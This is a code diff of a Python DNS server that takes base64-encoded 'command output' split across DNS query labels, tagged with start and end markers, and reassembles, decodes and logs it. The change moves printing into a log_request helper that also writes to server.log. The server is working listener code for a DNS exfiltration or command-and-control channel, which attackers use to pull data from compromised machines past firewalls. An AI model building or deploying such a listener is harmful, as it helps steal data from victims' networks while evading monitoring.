@@ -1,10 +1,22 @@
-import logging
 import threading
 import base64
 import argparse
 from datetime import datetime
 from dnslib import DNSRecord, QTYPE, RR, A
 from dnslib.server import DNSServer, BaseResolver, DNSLogger
+
+# Function to log DNS queries to both the console and server.log
+def log_request(current_time, source_ip, chunk):
+    if source_ip != '127.0.0.1':
+        # Format the log message
+        log_message = f"{current_time} | {source_ip} | {chunk}\n"
+        
+        # Print to console
+        print(log_message.strip())
+        
+        # Append the log message to the 'server.log' file
+        with open('server.log', 'a') as log_file:
+            log_file.write(log_message)
 
 # DNS Resolver
 class CommandResolver(BaseResolver):
@@ -17,7 +29,7 @@ class CommandResolver(BaseResolver):
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         # Get the source IP address
-        source_ip = handler.address[0]
+        source_ip = handler.client_address[0]
         
         qname = str(request.q.qname).strip(".")
         qtype = QTYPE[request.q.qtype]
@@ -27,13 +39,13 @@ class CommandResolver(BaseResolver):
             unique_id = labels[0].split("start-")[1]
             chunk = labels[1]
             self.chunks[unique_id] = [chunk]
-            print(f"{current_time} | {source_ip} | Start of new command with ID {unique_id}.")
+            log_request(current_time, source_ip, f"Start of new command with ID {unique_id}.")
         elif "end-" in labels[-1]:
             unique_id = labels[-1].split("end-")[1]
             chunk = labels[0]
             if unique_id in self.chunks:
                 self.chunks[unique_id].append(chunk)
-                print(f"{current_time} | {source_ip} | End of command with ID {unique_id}. Attempting to decode...")
+                log_request(current_time, source_ip, f"End of command with ID {unique_id}. Attempting to decode...")
                 self.decode_and_print(unique_id)
         else:
             chunk = labels[0]
@@ -42,11 +54,10 @@ class CommandResolver(BaseResolver):
                     self.chunks[unique_id].append(chunk)
                     break
         
-        # Print the DNS query with timestamp and source IP
-        if source_ip != '127.0.0.1':
-            print(f"{current_time} | {source_ip} | {chunk}")
+        # Log the DNS query with timestamp and source IP
+        log_request(current_time, source_ip, chunk)
         
-        # Return a fake non existing IP address as a response (e.g., 0.0.0.0)
+        # Return a fake non-existing IP address as a response (e.g., 0.0.0.0)
         reply = request.reply()
         reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0"), ttl=300))
         return reply
@@ -55,12 +66,11 @@ class CommandResolver(BaseResolver):
         base64_data = ''.join(self.chunks.get(unique_id, []))
         try:
             decoded_data = base64.b64decode(base64_data).decode('utf-8')
-            print(f"Decoded command output for ID {unique_id}:")
-            print(decoded_data)
+            log_request(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "127.0.0.1", f"Decoded command output for ID {unique_id}:\n{decoded_data}")
             # Clear the stored chunks for this unique ID
             del self.chunks[unique_id]
         except Exception as e:
-            print(f"Failed to decode base64 data for ID {unique_id}: {e}")
+            log_request(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "127.0.0.1", f"Failed to decode base64 data for ID {unique_id}: {e}")
 
 # Function to start the DNS server
 def start_dns_server(resolver, address="0.0.0.0", port=53):
@@ -68,9 +78,6 @@ def start_dns_server(resolver, address="0.0.0.0", port=53):
     server.start_thread()
 
 if __name__ == "__main__":
-    # Suppress logging from dnslib
-    logging.getLogger("dnslib").setLevel(logging.ERROR)
-
     # Set up argument parsing
     parser = argparse.ArgumentParser(description="A simple DNS server to receive and process DNS queries.")
     parser.add_argument("--port", type=int, default=None, help="Specify the port on which the DNS server will run.")
